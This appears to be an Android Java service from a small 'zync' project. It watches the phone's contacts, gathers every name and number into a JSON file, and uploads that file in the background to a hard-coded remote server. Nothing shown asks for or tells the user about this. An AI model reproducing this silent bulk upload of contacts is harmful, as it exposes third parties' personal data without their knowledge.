package project.kiran.zync;

import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class contactSyncer extends Service {
    public contactSyncer() {
    }
    @Override
    public void onCreate() {
        super.onCreate();
        getContentResolver()
                .registerContentObserver(
                        ContactsContract.Contacts.CONTENT_URI, true,
                        new contactChangeObserver());
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    class contactChangeObserver extends ContentObserver {
        public contactChangeObserver() {
            super(null);
        }
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Log.d("BLA","~~~~~~"+selfChange);
            Cursor cursor = getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null,null, null);
            dataWriter dw = new dataWriter();
            while (cursor.moveToNext()) {
                Map<String,String> data = new HashMap<>();
                data.put("name",cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                data.put("number",cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                JSONObject jo = dw.formatData(data,"CONTACT");
                JSONObject jdata = dw.formatData(data,"BATTERY");
                dw.setFile("contacts.json");
                dw.saveData(getApplicationContext(),String.valueOf(jo));
                Log.d("BLA",dw.getData(getApplicationContext()));
            }
            cursor.close();
            new sendContacts().execute(new File(dw.getFile(getApplicationContext())));

        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }
    }
    private class sendContacts extends AsyncTask<File,Void,String>{

        @Override
        protected String doInBackground(File... params) {
            String result = "";
            try {
                File file = params[0];
                serverRequest sr = new serverRequest("https://anoudis.com/zync/tst.php");
                sr.addFilePart("contactList",file);
               result =  sr.finish();
            } catch (IOException e) {
                e.printStackTrace();
            }
            Log.d("BLA",result);
            return result;
        }
    }
}
